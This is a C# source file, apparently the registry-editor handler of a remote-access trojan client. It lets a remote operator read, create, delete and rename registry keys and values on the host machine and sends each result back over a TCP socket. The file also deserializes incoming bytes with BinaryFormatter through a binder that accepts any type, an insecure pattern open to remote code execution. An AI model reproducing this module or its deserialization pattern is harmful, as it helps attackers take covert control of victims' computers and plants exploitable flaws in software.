using System;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using Client.Helper.RegManager;
using MessagePack;
using Microsoft.Win32;
using static Client.Helper.RegManager.RegistrySeeker;

namespace Client.HandlePacket
{
    public static class HandleRegEdit
    {
        public static void LoadKey(string RootKeyName)
        {
            try
            {
                var seeker = new RegistrySeeker();
                seeker.BeginSeeking(RootKeyName);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "LoadKey";
                msgpack.ForcePathObject("RootKey").AsString = RootKeyName;
                msgpack.ForcePathObject("Matches").SetAsBytes(Serialize(seeker.Matches));
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }


        public static void CreateKey(string ParentPath)
        {
            try
            {
                RegistryEditor.CreateRegistryKey(ParentPath, out var newKeyName, out var errorMsg);
                var Match = new RegSeekerMatch
                {
                    Key = newKeyName,
                    Data = RegistryKeyHelper.GetDefaultValues(),
                    HasSubKeys = false
                };

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "CreateKey";
                msgpack.ForcePathObject("ParentPath").AsString = ParentPath;
                msgpack.ForcePathObject("Match").SetAsBytes(Serialize(Match));
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        public static void DeleteKey(string KeyName, string ParentPath)
        {
            try
            {
                RegistryEditor.DeleteRegistryKey(KeyName, ParentPath, out var errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "DeleteKey";
                msgpack.ForcePathObject("ParentPath").AsString = ParentPath;
                msgpack.ForcePathObject("KeyName").AsString = KeyName;
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        public static void RenameKey(string OldKeyName, string NewKeyName, string ParentPath)
        {
            try
            {
                RegistryEditor.RenameRegistryKey(OldKeyName, NewKeyName, ParentPath, out var errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "RenameKey";
                msgpack.ForcePathObject("rootKey").AsString = ParentPath;
                msgpack.ForcePathObject("oldName").AsString = OldKeyName;
                msgpack.ForcePathObject("newName").AsString = NewKeyName;
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        public static void CreateValue(string KeyPath, string Kindstring)
        {
            var newKeyName = "";
            var Kind = RegistryValueKind.Unknown;
            switch (Kindstring)
            {
                case "0":
                {
                    Kind = RegistryValueKind.Unknown;
                    break;
                }
                case "1":
                {
                    Kind = RegistryValueKind.String;
                    break;
                }
                case "2":
                {
                    Kind = RegistryValueKind.ExpandString;
                    break;
                }
                case "3":
                {
                    Kind = RegistryValueKind.Binary;
                    break;
                }
                case "4":
                {
                    Kind = RegistryValueKind.DWord;
                    break;
                }
                case "7":
                {
                    Kind = RegistryValueKind.MultiString;
                    break;
                }
                case "11":
                {
                    Kind = RegistryValueKind.QWord;
                    break;
                }
            }

            try
            {
                RegistryEditor.CreateRegistryValue(KeyPath, Kind, out newKeyName, out var errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "CreateValue";
                msgpack.ForcePathObject("keyPath").AsString = KeyPath;
                msgpack.ForcePathObject("Kindstring").AsString = Kindstring;
                msgpack.ForcePathObject("newKeyName").AsString = newKeyName;
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        public static void DeleteValue(string KeyPath, string ValueName)
        {
            try
            {
                RegistryEditor.DeleteRegistryValue(KeyPath, ValueName, out var errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "DeleteValue";
                msgpack.ForcePathObject("keyPath").AsString = KeyPath;
                msgpack.ForcePathObject("ValueName").AsString = ValueName;
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        public static void RenameValue(string OldValueName, string NewValueName, string KeyPath)
        {
            try
            {
                RegistryEditor.RenameRegistryValue(OldValueName, NewValueName, KeyPath, out var errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "RenameValue";
                msgpack.ForcePathObject("KeyPath").AsString = KeyPath;
                msgpack.ForcePathObject("OldValueName").AsString = OldValueName;
                msgpack.ForcePathObject("NewValueName").AsString = NewValueName;
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        public static void ChangeValue(RegValueData Value, string KeyPath)
        {
            try
            {
                RegistryEditor.ChangeRegistryValue(Value, KeyPath, out var errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "ChangeValue";
                msgpack.ForcePathObject("KeyPath").AsString = KeyPath;
                msgpack.ForcePathObject("Value").SetAsBytes(Serialize(Value));
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }


        public static byte[] Serialize(RegSeekerMatch[] Matches)
        {
            return Matches.Serialize();
        }

        public static byte[] Serialize(RegSeekerMatch Matche)
        {
            return Matche.Serialize();
        }

        public static byte[] Serialize(RegValueData Value)
        {
            return Value.Serialize();
        }

        public static RegValueData DeSerializeRegValueData(byte[] bytes)
        {
            var Value = bytes.Deserialize<RegValueData>();
            return Value;
        }
    }

    

    public static class Serializer
    {
        internal sealed class Binder : SerializationBinder
        {
            public override Type BindToType(string assemblyName, string typeName)
            {
                Type typeToDeserialize = null;

                var currentAssembly = Assembly.GetExecutingAssembly().FullName;
                typeName = typeName.Replace("Creeper.Helper", "Client.Helper.RegManager");
                assemblyName = currentAssembly;

                typeToDeserialize = Type.GetType($"{typeName}, {assemblyName}");
                return typeToDeserialize;
            }
        }
        public static byte[] Serialize<T>(this T @object)
        {
            using (var ms = new MemoryStream())
            {
                new BinaryFormatter().Serialize(ms, @object);
                return ms.ToArray();
            }
        }

        public static T Deserialize<T>(this byte[] byteArray)
        {
            using (var ms = new MemoryStream(byteArray))
            {
                return (T) new BinaryFormatter
                {
                    Binder = new Binder()
                }.Deserialize(ms);
            }
        }
    }
}